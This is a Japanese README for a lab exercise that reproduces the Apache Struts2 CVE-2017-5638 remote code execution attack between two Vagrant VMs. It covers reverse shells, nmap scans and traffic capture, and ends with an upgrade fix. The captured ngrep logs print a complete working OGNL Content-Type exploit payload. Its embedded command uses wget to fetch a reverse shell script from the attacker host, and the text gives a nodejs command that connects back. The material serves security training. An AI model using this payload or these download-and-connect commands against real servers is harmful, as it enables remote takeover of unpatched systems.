# Struts2脆弱性を利用した演習について
## Motivation
「すべてわかるセキュリティ大全 2018（日経コンピュータ、日経BP社）」で、情報処理推進機構（IPA）やJPCERT コーディネーションセンター（JPCERT/CC）が注意喚起を行った後も、Struts2脆弱性による情報流出事故が後を絶たなかったことを記事にしている。CVE-2017-5638はRemote Code Execution (RCE)」と言われる脆弱性のタイプで、Struts2脆弱性を利用し任意のコードを第三者が実行できる。また、攻撃コードが公開されており、企業などでは早急に対策を実施することが求められていた。

こうした背景で、Struts2脆弱性を利用した攻撃事象を再現し、WEB脆弱性の脅威に対する理解を促がすことは非常に重要である。  

## 学習目標
CyExcが提供する本演習では、学習者に対してのStruts2脆弱性の脅威を理解することを目的とし、Reverse Shellスクリプトを使用し、CVE-2017-5638の攻撃を再現する。VagrantにTarget(Struts2サーバ)とAttacker(WEBサーバ)の2つのゲストOSを構築した環境を提供する。Reverse Shellスクリプトは倫理の観点から、ここでの公開はしないこととする。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/block.png" title="Ex1演習環境構成図">

## Reverse Shellとは
TargetマシンからAttackerマシンに通信を開始するシェルのことである。
1. Attackerマシンから攻撃コードを送信する。
2. 攻撃に成功した場合、TargetマシンからAttackerマシンで待ち受けているポートに接続し、Attackerマシンにシェルの制御が奪われる。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/reverseshell.png" title="ReverseShell">

## シナリオ
Attacker OSからTarget OSに設置されたApache Struts2が設置されたサーバにアクセスし、悪意あるリクエストを送信する。また、Reverse Shellスクリプトを実行し、Apache Struts2が設置されたサーバのシェル制御を取得する。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/network.png" title="ネットワーク図">

## Prerequisite
* Vagrant
  * Plugin: landrush, vagrant-vbguest

## Installation　　
* Vagrant　　　
1. $ vagrant up --provision　　　   
2. $ vagrant landrush ls　　　   
ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。
```  
target.cyexc-target            192.168.33.10
10.33.168.192.in-addr.arpa     target.cyexc-target
attacker.cyexc-attacker        192.168.33.20
20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
```
3. target側のOS起動
$ vagrant ssh target
  i. $ cd target/　　　    
  ii.$ sudo docker-compose up --build
  iii. Browse to http://target.cyexc-target/struts2-showcase-2.3.12/index.action
4. attacker側のOS起動
$ vagrant ssh attacker
  i. $ cd attacker/　　　    
  ii.$ sudo docker-compose up --build
  iii. Browse to http://attacker.cyexc-attacker:8081/

  <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/screenshot.png" title="Screenshot">
  URL=http://target.cyexc-target/struts2-showcase-2.3.12/index.action

  CMDはTarget OSで実行したいシェルコマンドを入力する。
  Reverse Shellスクリプトは`wget http://192.168.33.20:8081/reverseShellClient.js`と入力し、Attacker OSからTarget OSにダウンロードした。
  Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。
  以下はReverse ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。

<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/reverseshell_terminal.png" title="スクリーンショット">

## nmapについて
nmapは、ネットワーク調査ツールおよびセキュリティ/ポートスキャンツールである。どこのサーバからどのようにネットワークが構成されているのかを外部から調べることができる。
* 主な機能
  * ポートスキャン
  * ホストの特定
  * サービスアプリケーションの特定
  * OSの種類、バージョンの特定
  * パケットフィルタの特定
  * ファイアウォールの特定
本演習環境でAttacker OSからTarget OSをnmapでスキャンすると、以下の情報が得られる。

/// OS情報
```
vagrant@attacker:~$ sudo nmap -O target.cyexc-target

Starting Nmap 6.40 ( http://nmap.org ) at 2018-01-20 07:53 UTC
Nmap scan report for target.cyexc-target (192.168.33.10)
Host is up (0.00076s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
8080/tcp open  http-proxy
MAC Address: 08:00:27:A1:5A:8A (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
````
/// ポート情報
```
vagrant@attacker:~$ sudo nmap -O target.cyexc-target

Starting Nmap 6.40 ( http://nmap.org ) at 2018-01-20 07:53 UTC
Nmap scan report for target.cyexc-target (192.168.33.10)
Host is up (0.00076s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
8080/tcp open  http-proxy
MAC Address: 08:00:27:A1:5A:8A (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
```
/// 特定ポートのサービスアプリケーション
```
vagrant@attacker:~$ sudo nmap -sV -p 80,8080 target.cyexc-target

Starting Nmap 6.40 ( http://nmap.org ) at 2018-01-20 08:01 UTC
Nmap scan report for target.cyexc-target (192.168.33.10)
Host is up (0.00040s latency).
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.13.8
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:A1:5A:8A (Cadmus Computer Systems)
```

## proxyサーバログの検知
Struts2脆弱性はWEBアプリケーションの脆弱性であるため、proxyログでStruts2脆弱性の攻撃は検知できない。

取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/ex1/logs/proxy.log)

## proxyサーバでHTTP通信をキャプチャ
実際にどのようなことが起きているのかは、WEBサーバのログで確認する。

  1. proxyサーバにログイン
  vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
  2. ngrepを使用してHTTP通信をキャプチャ
  root@c56fe08a3ea2:/# ngrep -W byline 'HTTP' -q > ngrep.log
  3. proxyサーバをログアウト
  root@c56fe08a3ea2:/#
  4. ゲストOSでproxyサーバのcontainer IDを調べる
  vagrant@webgoat:~/apps$ sudo docker ps
  CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES
  937fb140f393        myproxy               "nginx -g 'daemon of…"   6 minutes ago       Up 6 minutes        0.0.0.0:80->80/tcp       apps_proxy_1
  64742ebbea0f        myarachni             "bin/arachni_web --h…"   6 minutes ago       Up 6 minutes        0.0.0.0:9292->9292/tcp   apps_arachni_1
  425df1dc54ac        webgoat/webgoat-7.1   "java -Djava.securit…"   6 minutes ago       Up 6 minutes        0.0.0.0:8080->8080/tcp   apps_webgoat_1
  5. 取得したngrepのログをゲストOSにコピー
  vagrant@webgoat:~/apps$ sudo docker cp 937fb140f393:/ngrep.log .

/// Attacker OSからproxyサーバへのHTTPリクエスト
/// シェルコマンドが送信されているのがわかる
  T 192.168.33.20:57860 -> 192.168.1.100:80 [AP]
  GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
  User-Agent: Mozilla/5.0.
  Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).<span style="color:OrangeRed">(#cmd='wget http://192.168.33.20:8081/reverseShellClient.js')</span>.(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.

/// proxyサーバからApache Struts2に転送
  T 192.168.1.100:37888 -> 192.168.1.10:8080 [AP]
  GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
  X-Forwarded-Host: target.cyexc-target.
  X-Forwarded-Server: target.cyexc-target.
  X-Forwarded-For: 192.168.33.20.
  X-Forwarded-Proto: http.
  X-Real-IP: 192.168.33.20.
  Host: target.cyexc-target.
  Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).<span style="color:OrangeRed">(#cmd='wget http://192.168.33.20:8081/reverseShellClient.js')</span>.(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.

取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex1/logs/ngrep.log)

## 解決方法
Struts2脆弱性は以下のバージョンで発生する。Struts2をアップデートすることで、本現象は解決できる。
* Apache Struts 2.3.5 から 2.3.31
* Apache Struts 2.5 から 2.5.10

## References
* [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)
* [Apache Struts2 の脆弱性対策について(CVE-2017-5638)(S2-045)(S2-046)](https://www.ipa.go.jp/security/ciadr/vul/20170308-struts.html)
* [Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution](https://www.exploit-db.com/exploits/41570/)
* [nmap](https://nmap.org/man/jp/)
* [2015年JPCERT ログを活用した高度サイバー攻撃の早期発見と分析](https://www.jpcert.or.jp/research/APT-loganalysis_Presen_20151117.pdf)
* [Detecting Attacks on Web Applications from Log
Files](https://www.sans.org/reading-room/whitepapers/logging/detecting-attacks-web-applications-log-files-2074)
* [ngrep examples](https://github.com/jpr5/ngrep/blob/master/EXAMPLES.md)